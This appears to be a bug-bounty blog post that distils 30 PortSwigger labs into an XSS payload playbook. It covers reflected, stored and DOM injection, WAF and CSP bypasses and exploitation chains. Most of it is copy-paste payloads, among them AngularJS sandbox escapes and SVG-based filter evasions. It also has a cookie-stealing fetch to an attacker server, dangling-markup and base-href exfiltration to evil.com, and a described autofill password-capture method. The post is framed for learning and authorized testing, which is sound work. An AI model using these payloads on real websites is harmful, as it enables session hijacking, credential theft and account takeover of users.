---
title: "XSS Masterclass: 30 Labs, Every Context, Every Bypass — A Complete Playbook"
date: 2026-04-03T10:00:00+05:30
lastmod: 2026-04-03T10:00:00+05:30
author: Seetha
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
featureimage: img/thm.png
simg: img/thm.png
categories:
  - Security
  - BugBounty
tags:
  - xss
  - cross-site-scripting
  - waf-bypass
  - csp-bypass
  - dom-xss
  - reflected-xss
  - stored-xss
  - angularjs
  - portswigger
  - bug-bounty
  - payloads
draft: false
description: "Complete XSS attack playbook from 30 PortSwigger labs — reflected, stored, DOM, WAF bypasses, CSP bypasses, AngularJS escapes, and real exploitation chains. Copy-paste payloads for every injection context."
---

## Overview

This is everything I learned from completing 30 PortSwigger Web Security Academy XSS labs — distilled into a single reference you can use during real bug bounty hunting. No theory padding. Every section has the payload, the context it works in, and when you'd use it on a real target.

XSS isn't one vulnerability — it's a family of injection techniques that change completely depending on **where** your input lands in the page. The same payload that pops in an HTML body will do nothing inside a JavaScript string. This playbook is organized by injection context so you can match what you see in the wild to the right attack.

---

## Reflected XSS by Injection Context

The key question: **where does your input appear in the response?**

### HTML Body (No Encoding)

The simplest case. Your input lands directly in the HTML body with no filtering.

```html
<script>alert(document.domain)</script>
```

**Bug Bounty Takeaway:** Always start with this. If it works, you're done. Most modern apps won't be this easy, but legacy apps, admin panels, and internal tools often are.

---

### HTML Attribute Context

Angle brackets `<>` are encoded, but you're inside an attribute value.

```html
" autofocus onfocus="alert(document.domain)
```

This breaks out of the attribute and injects an event handler. The `autofocus` ensures it fires without user interaction.

**Bug Bounty Takeaway:** When you see your input reflected inside `value="YOUR_INPUT"`, try closing the attribute first. Event handlers like `onfocus`, `onmouseover`, `onerror` are your friends.

---

### JavaScript String Context

Your input lands inside a JS string: `var x = 'YOUR_INPUT';`

**When angle brackets are encoded:**

```javascript
'-alert(document.domain)-'
```

The single quote breaks the string, `-` is the subtraction operator (forces expression evaluation), and the trailing `'-'` closes the syntax cleanly.

**When quote AND backslash are escaped:**

```html
</script><script>alert(document.domain)</script>
```

If the app escapes `'` to `\'` and `\` to `\\`, but doesn't encode angle brackets — close the script tag entirely and open a new one.

**When angle + double quotes encoded, single quote escaped with backslash:**

```javascript
\'-alert(document.domain)//
```

The backslash `\` escapes the escape character. So `\'` becomes `\\'` — the backslash is escaped, and the quote breaks the string.

**Bug Bounty Takeaway:** JavaScript string context is extremely common (search terms echoed in JS variables). Test each escape individually: `'`, `"`, `\`, `<`, `>`. The bypass depends on which specific characters are filtered.

---

### JavaScript Template Literal

Your input is inside backticks: `` var x = `YOUR_INPUT`; ``

```javascript
${alert(document.domain)}
```

Template literals support expression interpolation with `${}`. If the app escapes quotes but not dollar-brace, this fires.

**Bug Bounty Takeaway:** Template literals are increasingly common in modern JS apps. Check for backtick contexts in addition to quote contexts.

---

### Canonical Link Tag

Your input appears in a `<link rel="canonical">` tag.

```
?%27accesskey=%27x%27onclick=%27alert(document.domain)
```

This injects `accesskey='x' onclick='alert(document.domain)'` into the tag. The user triggers it with `Alt+Shift+X` (varies by browser).

**Bug Bounty Takeaway:** Low interaction but still valid. Look for canonical links, Open Graph tags, and any meta tag that reflects URL parameters.

---

### JavaScript URL Context

Your input lands inside a JavaScript URL or an `href` with characters blocked.

```
javascript:fetch%28%27/exploit%27%29
```

Or use the throw/onerror chain:

```javascript
javascript:throw onerror=alert,document.domain
```

**Bug Bounty Takeaway:** URL-encoding can bypass character-level blocks. The `throw/onerror` pattern avoids parentheses entirely.

---

## WAF Bypass Techniques

This is where real bug bounty value lives. Most apps have WAFs. These bypasses are from labs simulating real WAF rules.

### Most Tags Blocked

When the WAF blocks `<script>`, `<img>`, `<svg>`, etc. — try `<body>`:

```html
<body onresize="alert(document.domain)">
```

Deliver via iframe with width manipulation:

```html
<iframe src="https://target.com/?search=<body onresize=alert(document.domain)>" onload="this.style.width='100px'">
```

### All Standard Tags Blocked

Use a **custom tag**:

```html
<xss autofocus tabindex=1 onfocus="alert(document.domain)">
```

Custom/unknown tags are not in the WAF blocklist. The `tabindex` + `autofocus` combo ensures `onfocus` fires.

### Only Specific Tags Allowed (e.g., SVG)

```html
<svg><animatetransform onbegin="alert(document.domain)">
```

The `onbegin` event fires immediately when an SVG animation element is parsed.

### Event Handlers AND href Blocked

Use SVG `<animate>` to manipulate attributes indirectly:

```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(document.domain)"/>
    <text x="20" y="20">Click</text>
  </a>
</svg>
```

**Bug Bounty Takeaway:** WAF bypass is about finding the gap between what's blocked and what the browser actually executes. Steps:
1. Fuzz all HTML tags against the WAF (use PortSwigger's XSS cheat sheet tag list)
2. Find which tags pass through
3. Fuzz event handlers for those allowed tags
4. Build payload from allowed tag + allowed event

---

## Stored XSS Vectors

Stored XSS is where the big bounties are — persistent, affects all users, no click required.

### Comment Body

```html
<script>alert(document.domain)</script>
```

In comment fields with no sanitization.

### Website URL Field

```
javascript:alert(document.domain)
```

If the app puts your "website" into an `<a href="...">` — the `javascript:` protocol fires on click.

### onclick Handler Injection

When your input lands in an `onclick` attribute:

```
&apos;-alert(document.domain)-&apos;
```

**Bug Bounty Takeaway:** For stored XSS, focus on:
- Profile fields (name, bio, website, location)
- Comments and reviews
- Team/org names
- File upload names
- Any field that other users will view

---

## DOM XSS — Sinks and Sources

DOM XSS happens entirely in the browser. The server response is clean — the vulnerability is in client-side JavaScript.

### Common Dangerous Sinks

| Sink | Payload Strategy |
|---|---|
| `document.write()` | break out of written context with closing tags |
| `innerHTML` | img/svg with onerror (script tags do NOT fire in innerHTML) |
| jQuery `.attr('href', input)` | `javascript:` protocol |
| jQuery selector `$(input)` | inject via hashchange + iframe |
| AngularJS expressions | constructor chain via `$on.constructor` |

### innerHTML Sink

```html
<img src=x onerror=alert(document.domain)>
```

**Critical:** `<script>` tags do NOT execute when injected via innerHTML. Use `<img>`, `<svg>`, or any tag with an event handler instead.

### jQuery Selector Sink

If `$(location.hash)` or `$(userInput)` is called — jQuery creates DOM elements from HTML strings. Deliver via:

```html
<iframe src="https://target.com/#" onload="this.src += '<img src=x onerror=alert(1)>'">
```

### AngularJS Expression Injection

When the page has `ng-app`:

```
{{$on.constructor('alert(document.domain)')()}}
```

Or the full sandbox escape:

```
{{toString().constructor.prototype.charAt=[].join;$on.constructor('alert(document.domain)')()}}
```

**Bug Bounty Takeaway:** DOM XSS recon:
1. Search JS source for dangerous sinks: `innerHTML`, `$.html()`, `$()`
2. Trace what user-controlled data reaches these sinks
3. Check for AngularJS (`ng-app` in HTML)
4. Use browser DevTools Sources panel to set breakpoints on sinks

---

## CSP Bypass Checklist

Content Security Policy is the last line of defense. These are the misconfigurations that break it:

| CSP Weakness | Bypass |
|---|---|
| `unsafe-inline` in script-src | Inline `<script>` tags work directly |
| CDN whitelisted (cdnjs, googleapis) | Host your payload on the CDN, load via `<script src=...>` |
| JSONP endpoint on whitelisted domain | `<script src="https://whitelisted.com/jsonp?callback=alert">` |
| Missing `base-uri` directive | `<base href="https://evil.com/">` — all relative script paths load from your server |
| No CSP at all | Everything works |

### Dangling Markup for CSP Bypass

When CSP blocks script execution but you can inject HTML:

```html
<img src="https://evil.com/steal?data=
```

Leave the tag unclosed. The browser will include everything after your injection (up to the next `"`) as part of the URL — including CSRF tokens, session data, whatever is in the HTML.

**Bug Bounty Takeaway:** Always check the CSP header. Use CSP Evaluator to find weaknesses. Missing `base-uri` is surprisingly common.

---

## Exploitation Chains

Finding XSS is step one. Proving impact is what gets you paid.

### Cookie Theft

```javascript
fetch('https://YOUR-SERVER.com/steal?c=' + document.cookie)
```

**Only works if:** cookies don't have the `HttpOnly` flag. Check `Set-Cookie` headers first.

### Password Capture via Autofill

Inject a fake login form. Browsers with saved credentials will autofill it. Use a timeout to wait for autofill, then exfiltrate the values via fetch to your server.

### CSRF Token Bypass

XSS on the same origin can fetch any page, extract CSRF tokens from the DOM, and forge state-changing requests. This defeats ALL CSRF protections — tokens, SameSite cookies, referer checks — because the request originates from the same origin.

**Bug Bounty Takeaway:** When writing your report, always demonstrate the maximum impact:
1. Can you steal cookies? → Account takeover
2. Can you capture credentials? → Account takeover
3. Can you bypass CSRF? → Account takeover via email change
4. At minimum: `document.domain` proves same-origin execution

---

## Quick Reference Table

| Context | First Test | If Blocked, Try |
|---|---|---|
| HTML body | `<script>alert(1)</script>` | `<img src=x onerror=alert(1)>` |
| Attribute | `" onfocus=alert(1) autofocus="` | `' onfocus=alert(1) autofocus='` |
| JS string | `'-alert(1)-'` | `</script><script>alert(1)//` |
| Template literal | `${alert(1)}` | — |
| href/src | `javascript:alert(1)` | URL-encode the payload |
| innerHTML | `<img src=x onerror=alert(1)>` | `<svg onload=alert(1)>` |
| AngularJS | `{{constructor.constructor('alert(1)')()}}` | — |
| Behind WAF | Fuzz tags then fuzz events then build payload | Custom tag + tabindex + autofocus |

---

## Bug Bounty Recon Checklist

1. **Search boxes** — URL params reflected in page
2. **Profile fields** — name, bio, website (stored XSS goldmine)
3. **Comment/review fields** — stored, viewed by other users
4. **JS source** — search for dangerous sinks like `innerHTML`, `$()`
5. **AngularJS** — check for `ng-app` in HTML source
6. **CSP header** — `curl -I target.com`, look for misconfigs
7. **Cookie flags** — missing `HttpOnly` = cookie theft possible
8. **Blind XSS** — inject in support tickets, feedback forms, admin-viewed fields (use XSS Hunter or Burp Collaborator)

---

*Built from 30 PortSwigger Web Security Academy labs. Each technique tested and verified. Use responsibly on authorized targets only.*
